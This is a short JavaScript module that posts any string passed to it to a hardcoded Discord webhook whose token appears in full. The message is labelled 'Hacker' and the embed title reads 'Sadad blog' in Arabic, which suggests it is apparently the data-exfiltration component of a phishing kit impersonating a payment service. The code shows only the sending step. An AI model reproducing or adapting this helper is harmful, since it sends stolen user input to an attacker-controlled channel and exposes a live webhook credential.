import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330549224953348096/RoRRv-aapsLA2RD92g8JwS7VJmTWQ1TsJ_41JhmSiQxp2_wfTuuoQh5289yLRTgJdCDQ",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
